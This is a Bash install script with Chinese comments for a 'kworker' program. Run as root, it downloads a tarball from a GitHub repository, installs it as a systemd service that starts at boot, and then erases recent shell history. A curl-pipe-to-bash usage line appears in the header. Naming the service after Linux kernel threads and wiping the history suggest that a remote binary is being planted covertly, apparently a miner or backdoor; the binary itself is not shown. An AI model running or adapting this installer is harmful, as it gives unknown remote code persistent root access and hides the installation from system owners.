#!/bin/bash

# ============================================
# kworker 一键安装脚本
# 项目地址: https://github.com/thm1472581-dotcom/kworker
# 使用方法: bash -c "$(curl -fsSL https://raw.githubusercontent.com/thm1472581-dotcom/kworker/master/install.sh)"
# ============================================

set -e  # 遇到错误立即退出

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# 配置变量
INSTALL_DIR="/var/local/kworker"
SERVICE_NAME="kworker"
DOWNLOAD_URL="https://raw.githubusercontent.com/thm1472581-dotcom/kworker/master/kworker.tar.gz"
# 备用下载地址（如果GitHub raw被墙，可以使用以下镜像）
# DOWNLOAD_URL="https://ghproxy.net/https://raw.githubusercontent.com/thm1472581-dotcom/kworker/master/kworker.tar.gz"

# 打印信息函数
print_info() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

print_warn() {
    echo -e "${YELLOW}[WARN]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

# 检查是否为root用户
check_root() {
    if [ "$EUID" -ne 0 ]; then
        print_error "请使用 root 用户执行此脚本"
        exit 1
    fi
}

# 检查系统依赖
check_dependencies() {
    print_info "检查系统依赖..."
    
    # 检查 curl 或 wget
    if command -v curl &> /dev/null; then
        DOWNLOAD_CMD="curl -fsSL"
        print_info "检测到 curl，将使用 curl 下载"
    elif command -v wget &> /dev/null; then
        DOWNLOAD_CMD="wget -q -O-"
        print_info "检测到 wget，将使用 wget 下载"
    else
        print_error "未找到 curl 或 wget，请先安装其中之一"
        exit 1
    fi
    
    # 检查 tar
    if ! command -v tar &> /dev/null; then
        print_error "未找到 tar 命令，请先安装 tar"
        exit 1
    fi
    
    # 检查 systemctl
    if ! command -v systemctl &> /dev/null; then
        print_error "未找到 systemctl，请确保系统使用 systemd"
        exit 1
    fi
    
    print_success "依赖检查通过"
}

# 创建安装目录
create_directory() {
    print_info "创建安装目录: $INSTALL_DIR"
    mkdir -p "$INSTALL_DIR"
    if [ $? -eq 0 ]; then
        print_success "目录创建成功"
    else
        print_error "目录创建失败"
        exit 1
    fi
}

# 下载并解压文件
download_and_extract() {
    print_info "开始下载 kworker 程序包..."
    cd "$INSTALL_DIR" || exit 1
    
    # 如果存在旧的压缩包，先删除
    [ -f "kworker.tar.gz" ] && rm -f "kworker.tar.gz"
    
    # 下载文件
    if command -v curl &> /dev/null; then
        curl -fsSL "$DOWNLOAD_URL" -o kworker.tar.gz
    else
        wget -q "$DOWNLOAD_URL" -O kworker.tar.gz
    fi
    
    if [ $? -ne 0 ] || [ ! -f "kworker.tar.gz" ]; then
        print_error "下载失败，请检查网络或下载地址"
        print_error "下载地址: $DOWNLOAD_URL"
        exit 1
    fi
    print_success "下载完成"
    
    # 解压文件
    print_info "解压文件..."
    tar -xzf kworker.tar.gz
    if [ $? -ne 0 ]; then
        print_error "解压失败，请检查压缩包完整性"
        exit 1
    fi
    print_success "解压完成"
    
    # 清理压缩包
    rm -f kworker.tar.gz
}

# 设置文件权限
set_permissions() {
    print_info "设置文件权限..."
    
    # 设置可执行权限
    [ -f "kworker" ] && chmod +x kworker
    [ -f "kworker.sh" ] && chmod +x kworker.sh
    
    print_success "权限设置完成"
}

# 安装 systemd 服务
install_service() {
    print_info "安装 systemd 服务..."
    
    # 检查 service 文件是否存在
    if [ ! -f "kworker.service" ]; then
        print_error "未找到 kworker.service 文件"
        exit 1
    fi
    
    # 复制 service 文件
    cp kworker.service /etc/systemd/system/
    
    # 设置正确的权限（644，不是777）
    chmod 644 /etc/systemd/system/kworker.service
    
    # 重载 systemd
    systemctl daemon-reload
    
    print_success "服务安装完成"
}

# 启动并启用服务
start_service() {
    print_info "启动 kworker 服务..."
    
    # 启动服务
    systemctl start "$SERVICE_NAME"
    if [ $? -ne 0 ]; then
        print_error "服务启动失败"
        systemctl status "$SERVICE_NAME" --no-pager
        exit 1
    fi
    print_success "服务启动成功"
    
    # 设置开机自启
    print_info "设置开机自启..."
    systemctl enable "$SERVICE_NAME"
    if [ $? -eq 0 ]; then
        print_success "已设置开机自启"
    else
        print_warn "设置开机自启失败"
    fi
}

# 检查服务状态
check_status() {
    print_info "检查服务状态..."
    echo ""
    systemctl status "$SERVICE_NAME" --no-pager
    echo ""
}

# 清理历史记录
clean_history() {
    print_info "清理历史命令记录..."
    
    # 方法1：清空当前会话历史
    history -c 2>/dev/null || true
    
    # 方法2：删除历史文件中的记录
    if [ -f ~/.bash_history ]; then
        # 保留最近20条，删除其他
        tail -n 20 ~/.bash_history > ~/.bash_history.tmp
        mv ~/.bash_history.tmp ~/.bash_history
    fi
    
    # 方法3：使用 history 命令删除（如果可用）
    if command -v history &> /dev/null; then
        # 删除最近的20条记录
        for i in $(history | tail -20 | awk '{print $1}' | tac); do
            history -d "$i" 2>/dev/null
        done
    fi
    
    print_success "历史记录清理完成"
}

# 显示完成信息
show_complete_info() {
    echo ""
    echo "=========================================="
    print_success "kworker 安装完成！"
    echo "=========================================="
    echo -e "${GREEN}安装目录:${NC} $INSTALL_DIR"
    echo -e "${GREEN}服务名称:${NC} $SERVICE_NAME"
    echo -e "${GREEN}服务状态:${NC} 已启动并设置开机自启"
    echo ""
    echo -e "${GREEN}常用命令:${NC}"
    echo "  查看状态: systemctl status $SERVICE_NAME"
    echo "  启动服务: systemctl start $SERVICE_NAME"
    echo "  停止服务: systemctl stop $SERVICE_NAME"
    echo "  重启服务: systemctl restart $SERVICE_NAME"
    echo "  查看日志: journalctl -u $SERVICE_NAME -f"
    echo ""
    echo -e "${GREEN}配置文件:${NC}"
    echo "  程序配置: $INSTALL_DIR/c"
    echo "  启动脚本: $INSTALL_DIR/kworker.sh"
    echo "=========================================="
}

# 错误处理函数
error_handler() {
    print_error "安装过程中出现错误，请检查以上信息"
    print_error "如需帮助，请访问: https://github.com/thm1472581-dotcom/kworker"
    exit 1
}

# 主函数
main() {
    trap error_handler ERR
    
    echo ""
    echo "=========================================="
    echo "     kworker 一键安装脚本"
    echo "=========================================="
    echo ""
    
    check_root
    check_dependencies
    create_directory
    download_and_extract
    set_permissions
    install_service
    start_service
    check_status
    clean_history
    show_complete_info
}

# 执行主函数
main
